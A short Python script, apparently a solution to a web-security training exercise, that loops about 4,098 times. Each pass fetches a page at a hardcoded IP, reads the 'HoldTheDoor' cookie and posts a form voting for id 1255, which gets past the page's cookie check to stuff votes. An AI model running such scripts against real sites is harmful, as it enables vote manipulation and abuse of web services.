#!/usr/bin/python3

import requests

session = requests.Session()
url = 'http://158.69.76.135/level1.php'


for num in range(4098):
    try:
        get = session.get(url)
        print("session was get with persistent")
    except:
        raise ValueError("error")

    try:
        # getting the cookies from the session so we can use the key
        cookie = dict(session.cookies)
        print("getting cookies")
    except:
        print("error")

    #pass the key in the cookie dict with the coockie key-value	
    my_obj = {"id": '1255', 'holdthedoor': 'Submit', 'key': cookie['HoldTheDoor']}
    
    #sende the response to the url passin the data
    response = session.post(url, my_obj);
    print(num)
